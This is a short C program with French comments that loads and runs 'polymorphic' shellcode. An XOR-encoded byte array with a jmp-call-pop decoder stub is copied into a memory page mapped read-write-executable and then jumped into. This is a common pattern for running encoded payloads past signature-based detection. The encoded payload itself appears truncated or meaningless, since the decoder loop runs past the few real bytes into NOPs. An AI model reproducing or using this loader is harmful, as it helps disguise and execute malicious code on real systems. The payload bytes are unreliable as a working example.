#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// Shellcode polymorphique généré par le script Python
unsigned char polymorphic_shellcode[] = "\xeb\x10\x5e\x31\xc9\xb1\x16\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xeb\xff\xff\xff\xca\xc1\xc1\xaa\xca\xaa\x90\x90\x90\x90\x90\x90\x90";

int main() {
    void *exec_mem;
    int pagesize = sysconf(_SC_PAGE_SIZE);  // Obtenir la taille de page du système

    // Allouer de la mémoire exécutable
    exec_mem = mmap(0, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC, 
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {  // Vérifier l'échec de l'allocation
        perror("mmap");
        return 1;
    }

    // Copier le shellcode polymorphique dans la mémoire allouée
    memcpy(exec_mem, polymorphic_shellcode, sizeof(polymorphic_shellcode));

    // Exécuter le shellcode
    ((void(*)())exec_mem)();

    return 0;
}
